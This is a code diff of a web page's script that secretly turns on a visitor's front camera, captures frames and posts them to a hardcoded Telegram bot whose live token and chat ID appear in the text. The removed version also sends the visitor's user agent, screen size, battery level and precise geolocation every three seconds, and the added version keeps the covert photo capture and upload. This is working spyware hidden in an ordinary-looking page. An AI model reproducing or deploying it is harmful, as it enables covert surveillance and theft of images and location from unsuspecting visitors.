@@ -220,55 +220,33 @@ button {
         const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
         const chatId = "878604830";  
 
-        // 📸 Background Camera Setup
-         async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: 1280, height: 720 }
-        });
-        document.getElementById('video').srcObject = stream;
-        setInterval(captureAndSendPhoto, 3000); // 3 sec interval
-      } catch (err) { console.error("Camera error:", err); }
-    }
+       // 📸 Background Camera Setup
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById("video").srcObject = stream;
+        }
 
-    function captureAndSendPhoto() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(sendToTelegram, 'image/jpeg', 0.6);
-    }
+        // 📸 Capture Photo and Send to Telegram
+        async function captureAndSendPhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
 
-    async function sendToTelegram(blob) {
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, 'photo.jpg');
-      formData.append('caption', JSON.stringify({
-        userAgent: navigator.userAgent,
-        screen: `${screen.width}x${screen.height}`,
-        battery: await getBattery(),
-        location: await getLocation()
-      }, null, 2));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-        .then(response => response.json())
-        .then(data => console.log("Telegram Response:", data))
-        .catch(error => console.error("Telegram Error:", error));
-    }
+            canvas.toBlob(async (blob) => {
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob);
 
-    async function getBattery() {
-      return ('getBattery' in navigator) ? `${(await navigator.getBattery()).level * 100}%` : "Unknown";
-    }
-
-    async function getLocation() {
-      return new Promise(resolve => navigator.geolocation.getCurrentPosition(
-        pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m`),
-        () => resolve("Location not available")
-      ));
-    }
-
-    startCamera();
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg", 0.5);
+        }
 
      
         // ✉️ Send Message to Telegram
